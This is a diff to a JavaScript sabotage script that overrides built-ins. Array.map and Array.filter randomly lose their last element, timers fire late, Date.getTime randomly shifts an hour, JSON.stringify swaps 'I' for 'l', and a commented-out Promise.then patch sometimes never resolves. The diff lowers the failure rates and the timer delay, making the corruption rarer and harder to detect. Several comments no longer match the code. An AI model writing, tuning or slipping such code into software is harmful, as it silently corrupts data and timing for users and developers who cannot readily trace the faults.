@@ -34,13 +34,13 @@
 	};
 
 	/**
-	 * Array.map has 5% chance drop the last element
-	 * @zh Array.map方法的结果有5%几率丢失最后一个元素
+	 * Array.map has 1% chance drop the last element
+	 * @zh Array.map方法的结果有1%几率丢失最后一个元素
 	 */
 	const _map = Array.prototype.map;
 	Array.prototype.map = function (...args) {
 		result = _map.call(this, ...args);
-		if (_rand() < 0.05) {
+		if (_rand() < 0.01) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -57,13 +57,13 @@
 	// };
 
 	/**
-	 * Array.fillter has 5% chance to lose the final element
-	 * @zh Array.filter的结果有5%的概率丢失最后一个元素
+	 * Array.fillter has 1% chance to lose the final element
+	 * @zh Array.filter的结果有1%的概率丢失最后一个元素
 	 */
 	const _filter = Array.prototype.filter;
 	Array.prototype.filter = function (...args) {
 		result = _filter.call(this, ...args);
-		if (_rand() < 0.05) {
+		if (_rand() < 0.01) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -71,24 +71,24 @@
 
 	/**
 	 * setTimeout will alway trigger 1s later than expected
-	 * @zh setTimeout总是会比预期时间慢1秒才触发
+	 * @zh setTimeout总是会比预期时间慢500毫秒秒才触发
 	 */
 	const _timeout = global.setTimeout;
 	const _interval = global.setInterval;
 	global.setTimeout = function (handler, timeout, ...args) {
-		return _timeout.call(global, handler, +timeout + 1000, ...args);
+		return _timeout.call(global, handler, +timeout + 500, ...args);
 	};
 	global.setInterval = function (handler, timeout, ...args) {
-		return _interval.call(global, handler, +timeout + 1000, ...args);
+		return _interval.call(global, handler, +timeout + 500, ...args);
 	};
 
 	/**
 	 * Promise.then has a 10% chance will not trigger
-	 * @zh Promise.then 有10%几率不会触发
+	 * @zh Promise.then 有1%几率不会触发
 	 */
 	// const _then = Promise.prototype.then;
 	// Promise.prototype.then = function (...args) {
-	// 	if (_rand() < 0.1) {
+	// 	if (_rand() < 0.01) {
 	// 		return new Promise(() => {});
 	// 	} else {
 	// 		return _then.call(this, ...args);
@@ -97,7 +97,7 @@
 
 	/**
 	 * JSON.stringify will replace 'I' into 'l'
-	 * @zh JSON.stringify 会把'I'变成'l'
+	 * @zh JSON.stringify 有30%几率会把'I'变成'l'
 	 */
 	const _stringify = JSON.stringify;
 	JSON.stringify = function (...args) {
@@ -110,12 +110,14 @@
 
 	/**
 	 * Date.getTime() always gives the result 1 hour slower
-	 * @zh Date.getTime() 的结果总是会慢一个小时
+	 * @zh Date.getTime() 1%几率的结果会慢一个小时
 	 */
 	const _getTime = Date.prototype.getTime;
 	Date.prototype.getTime = function (...args) {
 		let result = _getTime.call(this);
-		result -= 3600 * 1000;
+		if (_rand() < 0.01) {
+			result -= 3600 * 1000;
+		}
 		return result;
 	};
 
